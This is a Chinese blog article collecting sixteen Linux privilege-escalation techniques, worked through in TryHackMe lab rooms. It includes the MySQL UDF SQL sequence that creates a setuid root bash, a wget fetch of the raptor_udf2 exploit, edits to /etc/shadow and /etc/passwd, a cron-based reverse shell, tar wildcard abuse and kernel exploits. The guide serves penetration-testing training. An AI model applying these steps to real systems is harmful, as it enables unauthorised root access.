<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/NiJs85bixBeBbkT2MpMCHQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWhmNDqrjZqNjbJWxKnkp6IjFtXy3olXWL0tAkiaCUoSCLsTSyz2zgHlRnS2QicUey1ufnm2KyNTNDlA/640?wx_fmt=gif)

**00: 前言**

之前也写过一篇 windows 提权技术汇总这次是 Linux，同样也会标明每个提权场景靶场方便大家练习

**01:UDF 提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

1.UDF 全名 user-defined function capability

2. 它可以通过对 MYSQL 中的函数调用连接系统上可用的系统动态库

3. 系统动态库可以当成是 python 库文件, 在 Windows 上后缀是. dll，Linux 上的后缀是. so 使用 gcc 编译的时候注意平台

4.UDF 攻击条件:

4.1 必须获得 MYSQL 的账号最好是 root 这里可以是从 wp-config.php 这种地方看看有没有保存它的数据库账号密码然后去到 MYSQL 里面检查是否拥有 insert 插入权限 (检查命令: select User,Host from user where Insert_priv='Y';)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawc4JqfkNgtia110nDFwTZj3QaDsJOcaicLFmARl2g48BwgxSH7YicNS8ZbQ/640?wx_fmt=png)

4.2 可以更改数据库当然拿到 root 最好  

4.3 允许拷贝文件进来 (检查命令: show variables like 'local_infile'; 结果为 ON 才行)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcPZ1OP7vy8g0jAEjONtjXBJhCdJJbyCB0uCV0XIqrFhQvdXFYiceho4Q/640?wx_fmt=png)

5 攻击流程:

5.1 首先攻进去并且获得一个 MYSQL 数据库账号且权限比较高

5.2 上传一个恶意的动态库文件

5.3 在进入 MYSQL 以后通过 insert 函数把动态库文件存储进来

5.4 搭建连接

5.5 执行

6. 复现过程, 首先需要准备好文件，kali 上已有

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcSpYBetF7Zlljf0wTjZhMdnIJIluEekdxhRSN74icUdoHgKS6DiccNRiaQ/640?wx_fmt=png)

或者使用 wget http://0xdeadbeef.info/exploits/raptor_udf2.c 下载到本地

这里需要上传到受害机以后使用 gcc 去进行编译，由于是 linux 所以相应的后缀就是.so 了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcVOsdFdficyTgbGqEYBQTvRnxJmoMxmUzfb5kNmm9uM29Dib4GoQ1vOOA/640?wx_fmt=png)

接下来就是进入 mysql 里面了这里假设你已经获得了 root 且刚才上面提到的两个都满足了。这里逐一大概分析下下面的语句。

1.use mysql;// 使用 msql 这个表

2.create table foo(line blob);// 创建一个叫 foo 的表数据类型为 blob

3.insert into foo values(load_file(‘/home/user/tools/mysql-udf/raptor_udf2.so’)); 插入一条数据这条数据是加载了我们的恶意文件进去

4.select * from foo into dumpfile ‘usr/lib/mysql/plugin/raptor_udf2.so’;// 把刚才加载进来的文件丢到 mysql plugin 里面去相当于先加载然后丢到原有的配置文件里

5.create function do_system returns integer soname ‘raptor_udf2.so’;// 创建一个函数叫 dosystem

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcJyvcCXcMorVt0GwkRXVbXMn7KYYZrnRF7LllOXV1xN4CEFyhImWdhw/640?wx_fmt=png)

6. 忘记截图了, select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');// 自主启动选择刚才创建好的的函数然后把 bin/bash 复制到 /tmp 目录下顺便给它赋予超级权限。  

7. 最后启动成功变成 root。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcm9rEU15UBjNP2MAuQNHxtSgca2H7PtsicFMMU4AE2eMsZXZ7oibull2Q/640?wx_fmt=png)

**02: 可读的 / etc/shadow 文件**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

/etc/shadow 和 /etc/passwd 上面都会存储着这台机子上的用户密码信息。Passwd 可读但不会显示具体密码，理论上来讲只有 root 才能改。而 shadow 有加密的账号密码信息但是一般来讲是不可读的。这里假设管理员抬了我们一手拥有对 /etc/shadow 的读写权限。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcHicDuX8vVF47daaGggG1PGE8heoewbGTSdTxoYhKuGIPo8TSrRvkyhQ/640?wx_fmt=png)

使用 cat 输出里面的信息可以看到 root 的密码信息。直接复制下来 (: 代表分割的意思在 17298 前面那个: 停下)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcDwTbNLC7obib7INN3b8rnIYoCvGGv3FRRrXX4TFK4RqHiapE61oG1GiaA/640?wx_fmt=png)

保存成文本信息以后可用 john 进行解密。最后得到密码。切换就偷懒了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcEsBzXY88sba6lgpIJeiavn74YGjb8kErRrdrPsBCJr27TS3zMZ4rYhg/640?wx_fmt=png)

**03: 可写的 / etc/shadow 文件**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

前面可以看到这个文件权限是 rw 代表不仅可读还能写入东西进去

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcHicDuX8vVF47daaGggG1PGE8heoewbGTSdTxoYhKuGIPo8TSrRvkyhQ/640?wx_fmt=png)

这里用 kali 自带的 mkpasswd 工具指定好格式为 sha-512(可从上面 john 解密得知加密形势是 sha-512) 生成密码为 123456 然后输出

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcbKgPU1Wx3j2qsuB13mnd5lUxTNWXt5KfIwibu8ibntfib7ZBoiak9yPgDA/640?wx_fmt=png)

这里把东西贴回去

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcjCMJic5ibXN7ad1FSVJll8017YN0GjvIP1LMkNKCFFciafCVfknCVtN7g/640?wx_fmt=png)

最后 su 成功。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcYRIWaRevibgPO2UA6NJDV94WxS6oAlRtgBVURTBpxxx8lN6N6HKvG2A/640?wx_fmt=png)

**04: 可写的 / etc/passwd**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

这里忘记截图 /etc/passwd 的权限了。但是和 /etc/shadow 一样全靠管理员抬一手让普通用户也有权限去编辑。那我们首先可以在 kali 本地用 openssl passwd 生成新的加密密码。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcOUrPibE7oxSlqtnialBLwaz8Ciaic1JRdSNUKCYeVnkFlp1EH7libpt2UhQ/640?wx_fmt=png)

使用 vim 把之前的 x 给代替掉换成加密后的密码内容最后:wq 保存。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawco6Kib7thO59ws72jRGNDxW7SibiaQ9sViaqV3IYXOIHWC3HXzk8FUACic1Q/640?wx_fmt=png)

Su 可成功切换。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcPrDXT7JGul6fwFqibrGfGnOWZHh9ibP2ibJ3qwGy8ZI8IGITCkAIo9LlQ/640?wx_fmt=png)

**05:sudo 提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

Sudo 提权应该算是最经典的提权方法了。由于是靶机所以有比较多的方法去提权。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawczHjQL4dyJTgYIkUheEPMMmfEX5T1v1riavM78MlQfM8kc6ZFicZ5UfaQ/640?wx_fmt=png)

关于如何查对应的提权方法可以去 gtfobin 或者是把它下到本地一个一个慢慢对，下载链接 https://github.com/GTFOBins/GTFOBins.github.io 这里找到 less 也是有 sudo 提权方法的。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawc8oUgjHpRKhN6Vib7penbDItXM0l5xQPzjXYjYMXgOMP36K0TN1z4ogg/640?wx_fmt=png)

记得一定用 sudo + less 的路径然后按照它的方法点点点就可提权成功了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcgNS0FCuUF9BX6g3iaAgcVShogkiaww3Loxiaw90QicyjCN01m7asoQRC3Q/640?wx_fmt=png)

**06: 环境变量提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

先简单介绍一下环境变量是什么。在正常情况下环境变量 PATH 会存放一串目录名, 当 shell 执行某个程序并未找到完整的路径名的时候会根据 PATH 去查找。在前面用 sudo -l 的时候可以看到 env_keep(用户环境变量) 有两个值分别是 LD_PRELOAD 和 LD_LIBRARY_PATH

LD_LIBRARY_PATH= 提供首先会在某些动态库里面列出会使用到哪些动态库

LD_PRELOAD= 在某个程序运行前先加载一个对象

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcZjGBEibjheXTD09Fkia071Kp9bN0lWXouwsEYt2tsQC4NibbUtZqQKZ2g/640?wx_fmt=png)

这里会先讲讲 LD_LIBRARY_PATH, 首先这里是对 apache2 进行一波分析，使用 ldd 可以看到会用哪些动态库

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcUHHwu6iauCFNjW0ht4NOwBjmLYmM60sTtYL73alt2B81IjyMibg7CiacQ/640?wx_fmt=png)

这里我们打算对倒数第四个 libcrypt.so.1 动手。所用的恶意程序靶机也有提供在 /home/user/tools/sudo 下。然后我们使用 gcc 把它编译成新的动态库放在 /tmp 目录下。在编译好之后用 LD_LIBRARY_PATH 指定 apache2 在 /tmp 目录下找动态库那肯定能找到我们的恶意程序直接升级变成 root。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawc2PVz1MzCbvPwNIwnLtdv5YXLoIlv8VezX1iabjVhpPTmh1N4ObS5lWQ/640?wx_fmt=png)

而下一个就是 LD_PRELOAD 了。靶机上也在同一目录下配好了，可以直接用 gcc 去编译。编译好之后我们可以使用 LD_PRELOAD 指定恶意程序然后启动某个程序这里我选择 iftop 你选择其它也行。直接变成 root。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcckfT2libYUNw7icXNGjHjtmerBPlVQAaJRS7V27c4xzVYzuk5babAbQQ/640?wx_fmt=png)

**07:Cron job 提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

先简单介绍以下 cron job, 它是一个定时完成任务计划，可规定某些用户间隔 n 天后重复执行某些操作比如说创建文件或者清理文件夹内容这些

在操作之前可以看到目前是拥有可读权限

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcv0BL1OFrZ75HEbWfj6lg2KcIJqdatJcOkhHiaj0CvuOva53Zic4DMjWw/640?wx_fmt=png)

打开以后看到倒数第二行, root 会定期执行 overwrite.sh 这个脚本

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawccmkxsAdxBK6T492qlsGE4ic8DnAmHTNic4qXHZN7PiaY0cTs3SGRiaGgsA/640?wx_fmt=png)

使用 whereis 可定位到该脚本的位置同时发现可编辑该脚本

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcibibXh82gcEGtNXmXRUysKs4dXGibelDnicTtQqL1SCcOO7Jf6UW6qhs2A/640?wx_fmt=png)

那就直接上手在最底下加入一个新的 bash 反弹 shell 命令进去。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcKdXwiaib05amMYzACexQww9ILFm2eLPH02o4xEUMOXoibKoBcsBb87LnA/640?wx_fmt=png)

最后提前开启 nc 坐等获得 root shell 过来。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcWic2E1FfjwC0kdEwfNuG885hyby6jqOIZicRPWviatEfF4AvAt1dWVj5w/640?wx_fmt=png)

**08:Cron job 环境变量提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

接下来再看一波另外一种提权方法是利用环境变量来摸鱼。在 /etc/crontab 中显示的环境变量是从 /home/user 找起。而以 root 身份定时执行的 overwrite.sh 是在 /usr/local/bin 那里隔了好几条街。所以我们可以在 /home/user 目录下创建一个恶意的 overwrite.sh 文件让 root 执行。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcbKicFIDtiaYOaWkMtYsYMf4ibvic3nM2M4GKOL0yvicbBB4sPkXcf85uIcg/640?wx_fmt=png)

这里以 root 的身份赋予 /bin/bash 一个超级权限然后放在 /tmp 目录下。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcP7dTBwJ6XRmRPzbNgx1Biahlb3ZCLCApFHKWJiaiaytF1eR6wFNzCibThg/640?wx_fmt=png)

记得给够权限要不然运行不起来就尴尬了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcZTlDX0R2MTmy97Ydq9WGbSsyhaqicm3x6o4I6Qc3c4dJ5XRNic6ic8NgA/640?wx_fmt=png)

等待一会去到 /tmp 后果然有超级 bash 一个 -p 就行了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcLyJgjVBfTnTaI8rILj1JKOtovvT451ZneHiavY6BhYYQqPiaFiac6g9Lg/640?wx_fmt=png)

**09:Cron job 通配符提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

这里在 /etc/crontab 的最后一行有一个以 root 身份定期执行的 compress.sh 脚本该方法可能比较偏向 CTF 多点。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcOlQUgmtygOLkKgnGN9ubuickx0U72sicyAiaf3veyF2icqqJguHB3BjmjA/640?wx_fmt=png)

打开可以看到脚本执行的是去到 /home/user 目录下然后使用 tar 命令对其目录下的文件进行打包然后丢到 /tmp 目录下。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcaiaqFvY5Jjic99887B5M6LjVsL7aKVVUSaglZ6KsyHfCgtRVvYzBcThQ/640?wx_fmt=png)

这里研究了下 Try Hack Me 给出的思路是首先制作一个反弹 shell 然后丢回靶机上。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcWqJm36gLBbia7kUHZ0ME2jr8laojkngZcLU384aQnuLlCqiallTxKdnQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcYEs95Odo0JvMHKBZAuibiblcXZVw3kuE4WuAhoZ1Ox6kzNDNvuIqHTAw/640?wx_fmt=png)

然后赋予权限，这里会运用到 tar 命令的一个选项—checkpoint-action=exec=xxx 的时候 tar 不会把它当成文件内容把它进行打包而是把它当成命令去执行。所以我们就把这个 checkpoint-action-exec 把刚制作好的反弹 shell 进行特殊对待不当成文件打包起来而是执行。最后等待反弹 shell 开启 nc 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcuaqElZMPFemlkzdicAWryFZFml8QlqrbZZWL0z0Ocm7Vcv7Ceyqvgfw/640?wx_fmt=png)

**10: 利用 find 查找特殊权限已有漏洞**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

这里会用 find 查找一些特权程序。特权程序是指 root 和普通用户都可执行，其中某些程序可能会有漏洞可以根据 gtfobin 去查找相关利用方法或者是用 exploitdb 查找以前的 payload。比如这里我们找到一个与众不同的 exim-4.84-3

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcvdE46ou6hXGR8wozaAapIyGukMTZz63VInEEDLDXYKcBMw3jIvicFew/640?wx_fmt=png)

可以在 kali 下查找一波也有相关的历史漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcRTlprXpYtbKqXPvNVcDgSR4M6XST4aFTuauiaWzx0q7KcxgoicdhjHIw/640?wx_fmt=png)

靶机也是配备好相关 payload 的直接运行./cve-2016-1531.sh 直接一路升级变成 root。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcJia1ickJWDDVEicotriboEVOibRv1NBxDKtcED6FEa4OzL9N3hMZzMb0Zyw/640?wx_fmt=png)

**11: 特殊文件环境变量提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

这里在利用 find 查找特权程序的时候还要一个 suid-env 程序

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawciaawoT2Prj53HYUEiaXTcaoNebnT9qxo0oZaQia7uf4Mcfcj2DFMgBibiaQ/640?wx_fmt=png)

运行后会发现会启动 Apache 服务。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcgCYKXqWOLuVRUgHUExfVNYVM8lMqibw8tY2elZcibLrm4SombKH21htg/640?wx_fmt=png)

用 string 查看里面的内容可以得知 blablaba 最后一行 service apache2 start 是重点。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcEE6dVAPoMPicWnbnlFeBfo1HK3G47Og8hPiafPibcLwvXoWtYxFU1icUYw/640?wx_fmt=png)

因为它不像其它程序标明是 /usr/local/service 启动而是类似于查看本地是否有 service 启动，这里我们的机会来了，使用 gcc 编译好靶机自带的 service.c 脚本瞒天过海让它变成 service, 然后原先的 /suid-env 是特权程序可以以 root 执行重新设置好环境变量以后执行就相当于是 root 执行恶意脚本成功起飞。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcMnNsusjib9jib5J8XwTGPiczibrOc2fdJLHia4sicNMhIGHpfIT2enHaPsSA/640?wx_fmt=png)

**12: 查看历史记录寻找敏感信息**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

这里其实就全靠 admin 抬一手了，使用 cat 查看之前的历史记录可以看到 mysql 指令那里暴露了 root 的密码。可以直接无缝切换。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcpegNVTSFko8KkudiaAOOdXt6LyMj2nnVzuVMCoPUfg8q0bG0o0iczFsA/640?wx_fmt=png)

**13: 查看配置信息**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

这里的配置是指下面的这个.oxxn 文件。一般这种文件是会通往其它内网里面去的。如何可读的话可以查看一波里面的敏感信息之类的。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcqHZadAImHmGMESgz5kIWoQTE99gic9Ggs4leOqaVatd6GsS1DXVluVg/640?wx_fmt=png)

用 cat 输出以后可以看到倒数第四行有个 auth-user-pass

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcicnluP6zqjZyrlJicug7XLHJjoTAUrLJ7g068iaqJib2vuHBC74hApfMEQ/640?wx_fmt=png)

跟过去以后会有个 root 的账号密码信息当然这种是比较偏向于 CTF 多点的。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcQZbJbQNFmaDpA2mR709IAJ9jlIPXzwmcCxtwjopFicVYplqh6hr7Okg/640?wx_fmt=png)

**14: 内核提权**

来源: Try Hack Me

房间: https://tryhackme.com/room/linuxprivesc

提权的最简单方法可能就是查看内核看看能不能一键提权了。利用 uname 可以看到版本为 2.6 如果做过 vulnub 靶机的话就大概 DNA 动起来了内核脏牛提权专打 2.6 左右的版本。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcOfiaHZL2NX5YvqnO25Z0p8PteOqQA2ztGTY3PuFE6lSCWjQXuy9UHXQ/640?wx_fmt=png)

如果不太确定的话可以用一些辅助工具比如下面的 linux-exploit-suggester, 下载链接我会放到附录里面。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcZyjicYYJH7Olfo0XXxkQCibt3mDIBaKhhK6DhTtFicibGP8TZttI33NF5g/640?wx_fmt=png)

靶机也已经有现成的了，直接 gcc 编译好运行等待一会。最后就运行 /usr/bin/passwd 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcYPYObciaRZdX7Qkjic3cAQHnibaKmvGU2RvgfoUsKxiasB8H4zX6Z4icTEg/640?wx_fmt=png)

**15:Capability 提权**

来源: Try Hack Me

房间链接: https://tryhackme.com/room/linprivesc

这里先简单介绍下 capability 是什么。从 2.1 版本以后 Linux 开始引入 capability 让普通用户也可干 root 可做的事。有点类似于 SUDI 即前面 find 提权那里，不同之处在于 capability 可让某个程序拥有超能力而 sudo 只是针对某个用户 / 文件赋予它 SUID(超能力)。

关于查找超能力程序可以用 getcap -r 2>/dev/null 命令只查找正确的错误的丢到黑洞里面。这里找到 vim 和 view 都具备 cap_setuid+ep 能力 (cap_setuid 表示用户能够修改进程用户身份的特权操作)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcyBzHGOqAiagSxF0PicPJxIXATicg8c6KrW8yCTW1SsGLZHdibqRQczAPLA/640?wx_fmt=png)

这里有两个选择一个是去到 /home/karen/vim 那里一个失去 /home/ubuntu/view 都可以提权操作。这里我选的是 vim 在该用户目录下有给 vim 被赋予了超能力。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcvyicZ0Nib6kz3e6bh7OPPs4icfMdZHIdocxe24IGJuwVSM60w2IgRzSdg/640?wx_fmt=png)

具体使用方法可以参考波 gtfobin 搜索 vim 即可。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcPyez0KSBobgO9FNzzKdlI8xTGwuGqk80Q3vGqQL6pKwrCU9LLB5cvg/640?wx_fmt=png)

但是要小改以下顺便指明 py3 因为环境不同加上 setuid(0) 这是 root 的标配剩下照做即可最后变成 root。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcZpUDZctMmtsTzgzia4UOX8Rs5SJUM27v2MT2gY6sjx8jMA3eGF2591A/640?wx_fmt=png)

**16:NFS 提权**

来源: Try Hack Me

房间链接: https://tryhackme.com/room/linprivesc

NFS 是网络文件共享系统，可以允许网络中的计算机之间通过网络进行共享资源。可以理解为通过挂载远程计算机可以把目标资源挂载到本地访问虽然网速是真的卡。如果开启了 NFS，可以通过 cat /etc/exports 查看详细信息。可以看到倒数三行它们都剧本 no_root_squash 特征。在默认情况下，NFS 会把 root 用户更改为 nobody 用户并限制 root 以 root 身份执行任何文件。如果 no_root_squash 选项出现了共享当中，我们可以创建一个恶意的 SUID 可执行的文件在上面运行从而提权。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcl20ITr7MmCQf6piasZ5gol2NVAdlImWdxxFNJ0jXpJ34NpDrbB6fdOg/640?wx_fmt=png)

在 kali 本地用 showmount -e ip 看看是不是跟上面列举出来的信息一样。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcaMmsiaupJufA4FBG2yKXMvqjKlY0OJdxY8RQSLfwXmzibC6PEJufCysA/640?wx_fmt=png)

一样的话就先在 /tmp 目录下创个 backup 文件夹，然后用 Mount -o 进行挂载。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcphRvZ7HHbN3qpDaRPBn2ibfG0EWSj06InYNbuqrw3bvvzriaayefU8aA/640?wx_fmt=png)

挂载完以后创建一个简单的 C 脚本。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcrNzHb0Os9K1C0N6Ix7cK1Nd2icyEwtwYW9LLSAwHWHYc1KFDEow19ug/640?wx_fmt=png)

使用 gcc 编译并赋予一定的权限。  

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcsokClyF2okOPXrw4fuqOMFA7dWicexRFzBWTC2WvAEZMQG9ceibDlLLg/640?wx_fmt=png)

此时回到靶机正常来讲也是能看到文件更新的只需要运行一波就能一键变成 root 了。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcD8oU6syLjhSCCg4hKDe3b50iaGn9bRmarp0Vic2RXY8scMiarlNAo1Tag/640?wx_fmt=png)

**附录 1:Linux 服务器信息收集**

1. 查看内核信息可通过版本信息在 exploit dB 找到一些可利用的提权文件

命令: uname -a

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcxJo88sibibFFmwpAcVp077k5ELJy0FbHzA54vMdPHqmiagVnf5RRsA27w/640?wx_fmt=png)

2. 查看进程

命令: PS -A(查看所有进程) PS -aux(查看所有用户运行的进程)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcDQ540ficGXY2xCfVytv3e4jMT14V5yxEibkAOvGQ1qsJOEGoopIb4xyw/640?wx_fmt=png)

3. 查看环境变量

命令:sudo -l 或 env

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawcsTiavX1GOhMtSoKOkoCL2JweV9ZFUNzDMYnScD7F4H8zraicISibrzeyQ/640?wx_fmt=png)

4. 查看端口开放状态

命令: netstat -a(列举所有连接信息，可能会太多), netstat -lt(只列出正在开放的和 TCP 端口)

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QjHmh1e21kULUjLpu04iawc6kbC17KpIIuMpkGQ2OVPVtdv2ecln4GmE1E6qRHv8CcsockpKOsQFg/640?wx_fmt=png)

5. 查找 SUID 特权

命令: find / -perm -u=s -type f 2>/dev/null

查找 Linux 上的具备超能力的某个文件可以让当前用户提权它的权限

**附录 2: 常见工具链接**

Linpeas:https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

LinEnum: https://github.com/rebootuser/LinEnum

LinuxExploitSuggester: https://github.com/mzet-/linux-exploit-suggester